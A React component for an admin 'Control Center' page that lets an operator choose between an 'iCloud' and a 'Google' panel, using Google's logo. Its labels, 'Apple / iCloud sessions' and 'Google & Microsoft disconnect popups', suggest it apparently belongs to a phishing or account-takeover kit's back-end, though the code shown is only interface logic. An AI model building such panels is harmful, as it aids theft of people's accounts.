import { motion } from "framer-motion";
import { useNavigate } from "react-router-dom";
import { FiCloud } from "react-icons/fi";
import AdminAtmosphere from "../components/AdminAtmosphere";

function GoogleMark({ size = 36 }) {
  return (
    <svg viewBox="0 0 48 48" width={size} height={size} aria-hidden="true">
      <path
        fill="#EA4335"
        d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"
      />
      <path
        fill="#4285F4"
        d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"
      />
      <path
        fill="#FBBC05"
        d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"
      />
      <path
        fill="#34A853"
        d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"
      />
    </svg>
  );
}

function PanelSelect() {
  const navigate = useNavigate();

  const pick = (panel) => {
    try {
      sessionStorage.setItem("admin_panel", panel);
      sessionStorage.removeItem("admin_boot_intro");
    } catch {
      /* ignore */
    }
    if (panel === "icloud") navigate("/admin/dashboard");
    else navigate("/google");
  };

  return (
    <div className="relative min-h-screen overflow-hidden text-white flex items-center justify-center px-4">
      <AdminAtmosphere />

      <div className="relative z-10 w-full max-w-3xl">
        <motion.div
          initial={{ opacity: 0, y: 16 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.45 }}
          className="text-center mb-10"
        >
          <p className="text-[11px] uppercase tracking-[0.32em] text-sky-300/80">
            Control Center
          </p>
          <h1 className="mt-3 text-3xl sm:text-4xl font-semibold tracking-tight">
            Choose your panel
          </h1>
          <p className="mt-2 text-sm text-zinc-400">
            Pick a workspace — same login, different flow
          </p>
        </motion.div>

        <div className="grid sm:grid-cols-2 gap-4 sm:gap-5">
          <motion.button
            type="button"
            onClick={() => pick("icloud")}
            initial={{ opacity: 0, x: -24, scale: 0.96 }}
            animate={{ opacity: 1, x: 0, scale: 1 }}
            transition={{ delay: 0.12, type: "spring", stiffness: 260, damping: 22 }}
            whileHover={{ y: -4, scale: 1.02 }}
            whileTap={{ scale: 0.98 }}
            className="group relative overflow-hidden rounded-[1.75rem] border border-white/10 bg-white/[0.04] p-7 text-left backdrop-blur-xl shadow-[0_20px_60px_rgba(0,0,0,0.35)]"
          >
            <div
              className="pointer-events-none absolute inset-0 opacity-0 transition group-hover:opacity-100"
              style={{
                background:
                  "radial-gradient(600px 200px at 20% 0%, rgba(56,189,248,0.18), transparent 60%)",
              }}
            />
            <div className="relative">
              <div className="flex h-14 w-14 items-center justify-center rounded-2xl bg-gradient-to-br from-sky-400 to-blue-600 shadow-[0_0_30px_rgba(56,189,248,0.35)]">
                <FiCloud className="h-7 w-7" />
              </div>
              <h2 className="mt-5 text-2xl font-semibold tracking-tight">iCloud</h2>
              <p className="mt-2 text-sm text-zinc-400 leading-relaxed">
                Apple / iCloud sessions · Google & Microsoft disconnect popups
              </p>
              <span className="mt-6 inline-flex text-[12px] font-medium text-sky-300">
                Open panel →
              </span>
            </div>
          </motion.button>

          <motion.button
            type="button"
            onClick={() => pick("google")}
            initial={{ opacity: 0, x: 24, scale: 0.96 }}
            animate={{ opacity: 1, x: 0, scale: 1 }}
            transition={{ delay: 0.2, type: "spring", stiffness: 260, damping: 22 }}
            whileHover={{ y: -4, scale: 1.02 }}
            whileTap={{ scale: 0.98 }}
            className="group relative overflow-hidden rounded-[1.75rem] border border-white/10 bg-white/[0.04] p-7 text-left backdrop-blur-xl shadow-[0_20px_60px_rgba(0,0,0,0.35)]"
          >
            <div
              className="pointer-events-none absolute inset-0 opacity-0 transition group-hover:opacity-100"
              style={{
                background:
                  "radial-gradient(600px 200px at 80% 0%, rgba(66,133,244,0.16), transparent 55%), radial-gradient(400px 180px at 10% 100%, rgba(234,67,53,0.1), transparent 50%)",
              }}
            />
            <div className="relative">
              <div className="flex h-14 w-14 items-center justify-center rounded-2xl bg-white shadow-[0_8px_28px_rgba(0,0,0,0.25)]">
                <GoogleMark size={32} />
              </div>
              <h2 className="mt-5 text-2xl font-semibold tracking-tight">Google</h2>
              <p className="mt-2 text-sm text-zinc-400 leading-relaxed">
                Google case flow · redesigned admin on top of the google project
              </p>
              <span className="mt-6 inline-flex text-[12px] font-medium text-[#8ab4f8]">
                Open panel →
              </span>
            </div>
          </motion.button>
        </div>
      </div>
    </div>
  );
}

export default PanelSelect;
